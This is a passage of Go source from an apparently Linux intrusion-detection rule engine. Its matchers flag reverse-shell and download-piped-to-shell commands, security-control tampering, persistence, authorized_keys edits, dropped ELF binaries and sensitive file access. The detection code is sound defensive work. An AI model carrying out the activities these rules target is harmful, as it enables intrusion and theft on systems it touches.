		policy.HasProcessRole(event.Process.ParentName, "", "", "web")
}

func matchLongLivedProxyTorSession(event model.Event) bool {
	if event.Process == nil || event.Network == nil {
		return false
	}
	if policy.AddressScope(event.Network.DestAddress) != "public" {
		return false
	}
	if !policy.IsProxyOrTorPort(event.Network.Protocol, event.Network.DestPort) {
		return false
	}
	if networkConnectionAgeSeconds(event) < longLivedNetworkSessionSeconds {
		return false
	}
	return policy.HasAnyProcessRole(
		event.Process.Name,
		event.Process.Image,
		event.Process.Command,
		"shell",
		"interpreter",
		"network_tool",
	)
}

func buildNetworkEgressDetail(event model.Event) map[string]any {
	detail := map[string]any{}
	if event.Process != nil {
		detail["process_name"] = event.Process.Name
		detail["process_image"] = event.Process.Image
		detail["command"] = event.Process.Command
		detail["parent_name"] = event.Process.ParentName
		if roles := policy.ProcessRoles(event.Process.Name, event.Process.Image, event.Process.Command); len(roles) > 0 {
			detail["process_roles"] = cloneStringSlice(roles)
		}
		if parentRoles := policy.ProcessRoles(event.Process.ParentName, "", ""); len(parentRoles) > 0 {
			detail["parent_roles"] = cloneStringSlice(parentRoles)
		}
	}
	if event.Network != nil {
		detail["protocol"] = event.Network.Protocol
		detail["source_address"] = event.Network.SourceAddress
		detail["source_port"] = event.Network.SourcePort
		detail["dest_address"] = event.Network.DestAddress
		detail["dest_port"] = event.Network.DestPort
		detail["dest_scope"] = policy.AddressScope(event.Network.DestAddress)
		detail["dest_service"] = policy.PortServiceName(event.Network.Protocol, event.Network.DestPort)
	}
	return detail
}

func matchSensitivePathChange(event model.Event) bool {
	if event.File == nil || event.File.IsDir || !isInterestingFileOperation(event.File.Operation) {
		return false
	}

	return policy.IsSensitiveSystemPath(event.File.Path)
}

func matchAuthorizedKeysChange(event model.Event) bool {
	if event.File == nil || event.File.IsDir || !isInterestingFileOperation(event.File.Operation) {
		return false
	}

	return policy.IsAuthorizedKeysPath(event.File.Path)
}

func matchWritableTmpELFDrop(event model.Event) bool {
	if event.File == nil || event.File.IsDir || !isInterestingFileOperation(event.File.Operation) {
		return false
	}
	if !policy.IsWritableTmpPath(event.File.Path) {
		return false
	}
	return hasELFArtifact(event.File.Artifact)
}

func matchSystemELFChange(event model.Event) bool {
	if event.File == nil || event.File.IsDir || !isInterestingFileOperation(event.File.Operation) {
		return false
	}
	if !policy.IsSystemELFArtifactPath(event.File.Path) {
		return false
	}
	return hasELFArtifact(event.File.Artifact)
}

func matchSensitivePermissionDrift(event model.Event) bool {
	if event.Audit == nil || event.File == nil {
		return false
	}
	if !policy.IsSensitiveIntegrityPath(event.File.Path) {
		return false
	}
	return hasAuditFileModeChange(event.Audit)
}

func matchSensitiveOwnershipDrift(event model.Event) bool {
	if event.Audit == nil || event.File == nil {
		return false
	}
	if !policy.IsSensitiveIntegrityPath(event.File.Path) {
		return false
	}
	return hasAuditFileOwnershipChange(event.Audit)
}

func matchRemoteLoginFailed(event model.Event) bool {
	if event.Audit == nil {
		return false
	}
	if strings.TrimSpace(event.Audit.Family) != "login" || strings.TrimSpace(event.Audit.Result) != "fail" {
		return false
	}
	return isRemoteAudit(event.Audit)
}

func matchRemoteRootLoginSuccess(event model.Event) bool {
	if event.Audit == nil {
		return false
	}
	if strings.TrimSpace(event.Audit.Family) != "login" || strings.TrimSpace(event.Audit.Result) != "success" {
		return false
	}
	if !isRemoteAudit(event.Audit) {
		return false
	}
	return isRootUsername(auditUsername(event.Audit)) || isRootUsername(event.Audit.LoginUser)
}

func matchSecurityControlTamperCommand(event model.Event) bool {
	if event.Audit == nil {
		return false
	}
	if strings.TrimSpace(event.Audit.Family) != "command" {
		return false
	}
	return policy.IsSecurityControlTamperCommand(auditCommandText(event))
}

func matchDownloadPipeShellCommand(event model.Event) bool {
	return matchSuccessfulAuditCommand(event, policy.IsDownloadPipeShellCommand)
}

func matchReverseShellCommand(event model.Event) bool {
	return matchSuccessfulAuditCommand(event, policy.IsReverseShellCommand)
}

func matchSetuidSetgidBitCommand(event model.Event) bool {
	return matchSuccessfulAuditCommand(event, policy.IsSetuidSetgidBitCommand)
}

func matchPersistenceCommand(event model.Event) bool {
	return matchSuccessfulAuditCommand(event, policy.IsPersistenceCommand)
}

func matchAccountManagementCommand(event model.Event) bool {
	return matchSuccessfulAuditCommand(event, policy.IsAccountManagementCommand)
}

func matchSensitiveFileAccess(event model.Event) bool {
	if event.Audit == nil || event.File == nil {
		return false
	}
	if strings.TrimSpace(event.Audit.Family) != "file" || strings.TrimSpace(event.Audit.Result) != "success" {
		return false
	}
	if !policy.IsSensitiveAuditPath(event.File.Path) {
		return false
	}
	return policy.IsAuditReadAction(firstNonEmpty(event.Audit.Action, event.File.Operation))
}

func matchSensitiveFileMutation(event model.Event) bool {
	if event.Audit == nil || event.File == nil {
		return false
	}
	if strings.TrimSpace(event.Audit.Family) != "file" || strings.TrimSpace(event.Audit.Result) != "success" {
		return false
	}
	if !policy.IsSensitiveAuditPath(event.File.Path) {
		return false
	}
	return policy.IsAuditMutationAction(firstNonEmpty(event.Audit.Action, event.File.Operation))
}

func matchPrivilegeChange(event model.Event) bool {
	if event.Audit == nil {
		return false
	}
	return strings.TrimSpace(event.Audit.Family) == "privilege" &&
		strings.TrimSpace(event.Audit.Result) == "success"
}

func isInterestingFileOperation(operation string) bool {
	switch strings.ToUpper(strings.TrimSpace(operation)) {
	case "CREATE", "WRITE", "REMOVE", "RENAME", "CHMOD":
		return true
	default:
		return false
	}
}

func hasAuditFileModeChange(audit *model.Audit) bool {
	if audit == nil {
		return false
	}
	previous := strings.TrimSpace(audit.PreviousFileMode)
	current := strings.TrimSpace(audit.FileMode)
	return previous != "" && current != "" && previous != current
}

func hasAuditFileOwnershipChange(audit *model.Audit) bool {
	if audit == nil {
		return false
	}
	return changedStringPair(audit.PreviousFileOwner, audit.FileOwner) ||
		changedStringPair(audit.PreviousFileGroup, audit.FileGroup) ||
		changedStringPair(audit.PreviousFileUID, audit.FileUID) ||
		changedStringPair(audit.PreviousFileGID, audit.FileGID)
}

func changedStringPair(previous string, current string) bool {
	previous = strings.TrimSpace(previous)
	current = strings.TrimSpace(current)
	return previous != "" && current != "" && previous != current
}

func buildSensitiveFileDriftDetail(event model.Event, driftType string) map[string]any {
	detail := map[string]any{
		"path":       "",
		"action":     "",
		"drift_type": driftType,
	}
	if event.File != nil {
		detail["path"] = event.File.Path
		if artifact := buildArtifactDetail(event.File.Artifact); artifact != nil {
			detail["artifact"] = artifact
		}
	}
	if event.Audit != nil {
		detail["action"] = event.Audit.Action
		detail["previous_file_mode"] = event.Audit.PreviousFileMode
		detail["file_mode"] = event.Audit.FileMode
		detail["previous_file_uid"] = event.Audit.PreviousFileUID
		detail["file_uid"] = event.Audit.FileUID
		detail["previous_file_gid"] = event.Audit.PreviousFileGID
		detail["file_gid"] = event.Audit.FileGID
		detail["previous_file_owner"] = event.Audit.PreviousFileOwner
		detail["file_owner"] = event.Audit.FileOwner
		detail["previous_file_group"] = event.Audit.PreviousFileGroup
		detail["file_group"] = event.Audit.FileGroup
		if summary := buildSensitiveFileDriftSummary(event.Audit, driftType); summary != "" {
			detail["summary"] = summary
		}
	}
	return detail
}

func buildAuditCommandDetail(event model.Event) map[string]any {
	detail := map[string]any{
		"command":  auditCommandText(event),
		"image":    auditProcessImage(event.Process),
		"username": auditUsername(event.Audit),
	}
	if event.Audit != nil {
		detail["result"] = event.Audit.Result
		detail["login_user"] = event.Audit.LoginUser
		detail["session_id"] = event.Audit.SessionID
	}
	return detail
}

func buildProcessCommandDetail(event model.Event) map[string]any {
	detail := map[string]any{
		"command":      "",
		"image":        "",
		"process_name": "",
		"username":     "",
		"parent_name":  "",
	}
	if event.Process != nil {
		detail["command"] = event.Process.Command
		detail["image"] = event.Process.Image
		detail["process_name"] = event.Process.Name
		detail["username"] = event.Process.Username
		detail["parent_name"] = event.Process.ParentName
		if artifact := buildArtifactDetail(event.Process.Artifact); artifact != nil {
			detail["artifact"] = artifact
		}
	}
	return detail
}

func buildFileChangeDetail(event model.Event) map[string]any {
	detail := map[string]any{
		"path":      "",
		"operation": "",
		"is_dir":    false,
	}
	if event.File != nil {
		detail["path"] = event.File.Path
		detail["operation"] = event.File.Operation
		detail["is_dir"] = event.File.IsDir
		if artifact := buildArtifactDetail(event.File.Artifact); artifact != nil {
			detail["artifact"] = artifact
		}
	}
	return detail
}

func buildArtifactDetail(artifact *model.Artifact) map[string]any {
	if artifact == nil {
		return nil
	}
	detail := map[string]any{
		"path":        artifact.Path,
		"exists":      artifact.Exists,
		"size_bytes":  artifact.SizeBytes,
		"file_type":   artifact.FileType,
		"type_source": artifact.TypeSource,
		"magic":       artifact.Magic,
		"mime_type":   artifact.MimeType,
		"extension":   artifact.Extension,
	}
	if artifact.Hashes != nil {
		detail["hashes"] = map[string]any{
			"sha256": artifact.Hashes.SHA256,
			"md5":    artifact.Hashes.MD5,
		}
	}
	if artifact.ELF != nil {
		detail["elf"] = map[string]any{
			"class":         artifact.ELF.Class,
			"machine":       artifact.ELF.Machine,
			"byte_order":    artifact.ELF.ByteOrder,
			"entry_address": artifact.ELF.EntryAddress,
			"section_count": artifact.ELF.SectionCount,
			"segment_count": artifact.ELF.SegmentCount,
			"sections":      cloneStringSlice(artifact.ELF.Sections),
			"segments":      cloneStringSlice(artifact.ELF.Segments),
		}
	}
	return detail
}

func hasELFArtifact(artifact *model.Artifact) bool {
	if artifact == nil {
		return false
	}
	if strings.EqualFold(strings.TrimSpace(artifact.FileType), "elf") {
		return true
	}
	if artifact.ELF != nil {
		return true
	}
	return strings.HasPrefix(strings.ToLower(strings.TrimSpace(artifact.Magic)), "7f454c46")
}

func networkConnectionAgeSeconds(event model.Event) int64 {
	if len(event.Data) == 0 {
		return 0
	}
	switch value := event.Data["connection_age_seconds"].(type) {
	case int:
		return int64(value)
	case int32:
		return int64(value)
	case int64:
		return value
	case uint32:
		return int64(value)
	case uint64:
		return int64(value)
	case float64:
		return int64(value)
	default:
		return 0
	}
}

func networkPreviousConnectionState(event model.Event) string {
	if len(event.Data) == 0 {
		return ""
	}
	value, ok := event.Data["previous_connection_state"].(string)
	if !ok {
		return ""
	}
	return strings.TrimSpace(value)
}

func buildSensitiveFileDriftSummary(audit *model.Audit, driftType string) string {
	if audit == nil {
		return ""
	}
	switch driftType {
	case "permission":
		if !hasAuditFileModeChange(audit) {
			return ""
		}
		return fmt.Sprintf("mode %s -> %s", strings.TrimSpace(audit.PreviousFileMode), strings.TrimSpace(audit.FileMode))
	case "ownership":
		items := make([]string, 0, 2)
		if changedStringPair(audit.PreviousFileOwner, audit.FileOwner) || changedStringPair(audit.PreviousFileGroup, audit.FileGroup) {
			items = append(items, fmt.Sprintf(
				"owner/group %s/%s -> %s/%s",
				emptyFallback(strings.TrimSpace(audit.PreviousFileOwner), "?"),
				emptyFallback(strings.TrimSpace(audit.PreviousFileGroup), "?"),
				emptyFallback(strings.TrimSpace(audit.FileOwner), "?"),
				emptyFallback(strings.TrimSpace(audit.FileGroup), "?"),
			))
		}
		if changedStringPair(audit.PreviousFileUID, audit.FileUID) || changedStringPair(audit.PreviousFileGID, audit.FileGID) {
			items = append(items, fmt.Sprintf(
				"uid/gid %s:%s -> %s:%s",
				emptyFallback(strings.TrimSpace(audit.PreviousFileUID), "?"),
				emptyFallback(strings.TrimSpace(audit.PreviousFileGID), "?"),
				emptyFallback(strings.TrimSpace(audit.FileUID), "?"),
				emptyFallback(strings.TrimSpace(audit.FileGID), "?"),
			))
		}
		return strings.Join(items, " · ")
	default:
		return ""
	}
}

func emptyFallback(value string, fallback string) string {
	if value == "" {
		return fallback
	}
	return value
}

func firstNonEmpty(values ...string) string {
	for _, value := range values {
		trimmed := strings.TrimSpace(value)
		if trimmed != "" {
			return trimmed
		}
	}
	return ""
}

func normalizePath(value string) string {
	return policy.NormalizePath(value)
}

func auditCommandText(event model.Event) string {
	command := ""
	if event.Process != nil {
		command = strings.TrimSpace(firstNonEmpty(event.Process.Command, event.Process.Image))
	}
	if command == "" && event.Audit != nil {
		command = strings.TrimSpace(event.Audit.How)
	}
	return command
}

func auditUsername(audit *model.Audit) string {
	if audit == nil {
		return ""
	}
	return strings.TrimSpace(firstNonEmpty(audit.Username, audit.LoginUser))
}

func auditAction(audit *model.Audit) string {
	if audit == nil {
		return ""
	}
	return strings.TrimSpace(audit.Action)
}

func auditFilePath(file *model.File) string {
	if file == nil {
		return ""
	}
	return strings.TrimSpace(file.Path)
}

func auditProcessImage(process *model.Process) string {
	if process == nil {
		return ""
	}
	return strings.TrimSpace(process.Image)
}

func matchProcessCommand(event model.Event, matcher func(string) bool) bool {
	if event.Process == nil || matcher == nil {
		return false
	}
	return matcher(processCommandText(event.Process))
}

func processCommandText(process *model.Process) string {
	if process == nil {
		return ""
	}
	return strings.TrimSpace(firstNonEmpty(process.Command, process.Image))
}

func matchSuccessfulAuditCommand(event model.Event, matcher func(string) bool) bool {
	if event.Audit == nil || matcher == nil {
		return false
	}
	if strings.TrimSpace(event.Audit.Family) != "command" {
		return false
	}
	if strings.TrimSpace(event.Audit.Result) == "fail" {
		return false
	}
	return matcher(auditCommandText(event))
}

func isRemoteAudit(audit *model.Audit) bool {
	if audit == nil {
		return false
	}
	return strings.TrimSpace(audit.RemoteIP) != "" || strings.TrimSpace(audit.RemoteHost) != ""
}

func isRootUsername(value string) bool {
	return strings.EqualFold(strings.TrimSpace(value), "root")
}

func snapshotEvent(event model.Event) map[string]any {
	detail := map[string]any{
		"type":   event.Type,
		"source": event.Source,
		"tags":   cloneStringSlice(event.Tags),
		"labels": cloneStringMap(event.Labels),
	}
	if !event.Timestamp.IsZero() {
		detail["timestamp"] = event.Timestamp.UTC().Format(time.RFC3339Nano)
	}
	if event.Process != nil {
		detail["process"] = map[string]any{
			"pid":         event.Process.PID,
			"parent_pid":  event.Process.ParentPID,
			"image":       event.Process.Image,
			"command":     event.Process.Command,
			"parent_name": event.Process.ParentName,
		}
		if artifact := buildArtifactDetail(event.Process.Artifact); artifact != nil {
			detail["process"].(map[string]any)["artifact"] = artifact
		}
	}
	if event.Network != nil {
		detail["network"] = map[string]any{
			"protocol":         event.Network.Protocol,
			"source_address":   event.Network.SourceAddress,
			"dest_address":     event.Network.DestAddress,
			"source_port":      event.Network.SourcePort,
			"dest_port":        event.Network.DestPort,
			"connection_state": event.Network.ConnectionState,
		}
	}
	if event.File != nil {
		detail["file"] = map[string]any{
			"path":      event.File.Path,
			"operation": event.File.Operation,
			"is_dir":    event.File.IsDir,
			"mode":      event.File.Mode,
			"uid":       event.File.UID,
			"gid":       event.File.GID,
			"owner":     event.File.Owner,
			"group":     event.File.Group,
		}
		if artifact := buildArtifactDetail(event.File.Artifact); artifact != nil {
			detail["file"].(map[string]any)["artifact"] = artifact
		}
	}
	if event.Audit != nil {
		detail["audit"] = map[string]any{
			"sequence":            event.Audit.Sequence,
			"record_types":        cloneStringSlice(event.Audit.RecordTypes),
			"family":              event.Audit.Family,
			"category":            event.Audit.Category,
			"record_type":         event.Audit.RecordType,
			"result":              event.Audit.Result,
			"session_id":          event.Audit.SessionID,
			"action":              event.Audit.Action,
			"object_type":         event.Audit.ObjectType,
			"object_primary":      event.Audit.ObjectPrimary,
			"object_secondary":    event.Audit.ObjectSecondary,
			"how":                 event.Audit.How,
			"username":            event.Audit.Username,
			"uid":                 event.Audit.UID,
			"login_user":          event.Audit.LoginUser,
			"auid":                event.Audit.AUID,
			"terminal":            event.Audit.Terminal,
			"remote_ip":           event.Audit.RemoteIP,
			"remote_port":         event.Audit.RemotePort,
			"remote_host":         event.Audit.RemoteHost,
			"process_cwd":         event.Audit.ProcessCWD,
			"file_mode":           event.Audit.FileMode,
			"file_uid":            event.Audit.FileUID,
			"file_gid":            event.Audit.FileGID,
			"file_owner":          event.Audit.FileOwner,
			"file_group":          event.Audit.FileGroup,
			"previous_file_mode":  event.Audit.PreviousFileMode,
			"previous_file_uid":   event.Audit.PreviousFileUID,
			"previous_file_gid":   event.Audit.PreviousFileGID,
			"previous_file_owner": event.Audit.PreviousFileOwner,
			"previous_file_group": event.Audit.PreviousFileGroup,
		}
	}
	if len(event.Data) > 0 {
		detail["data"] = cloneMapStringAny(event.Data)
	}
	return detail
}

func mergeTags(left []string, right []string) []string {
	if len(left) == 0 && len(right) == 0 {
		return nil
	}
	seen := make(map[string]struct{}, len(left)+len(right))
	merged := make([]string, 0, len(left)+len(right))
	for _, values := range [][]string{left, right} {
		for _, value := range values {
			if value == "" {
				continue
			}
			if _, ok := seen[value]; ok {
				continue
			}
			seen[value] = struct{}{}
			merged = append(merged, value)
		}
	}
	return merged
}

func cloneMapStringAny(values map[string]any) map[string]any {
	if len(values) == 0 {
		return map[string]any{}
	}
	cloned := make(map[string]any, len(values))
	for key, value := range values {
		cloned[key] = cloneValue(value)
	}
	return cloned
}

func cloneStringMap(values map[string]string) map[string]string {
	if len(values) == 0 {
		return map[string]string{}
	}
	cloned := make(map[string]string, len(values))
	for key, value := range values {
		cloned[key] = value
	}
	return cloned
}

func cloneStringSlice(values []string) []string {
	if len(values) == 0 {
		return []string{}
	}
	cloned := make([]string, len(values))
	copy(cloned, values)
	return cloned
}

func cloneValue(value any) any {
	switch typed := value.(type) {
	case map[string]any:
		return cloneMapStringAny(typed)
	case map[string]string:
		return cloneStringMap(typed)
	case []string:
		return cloneStringSlice(typed)
	case []any:
		cloned := make([]any, len(typed))
		for index, item := range typed {
			cloned[index] = cloneValue(item)
		}
		return cloned
	default:
		return typed
	}
}
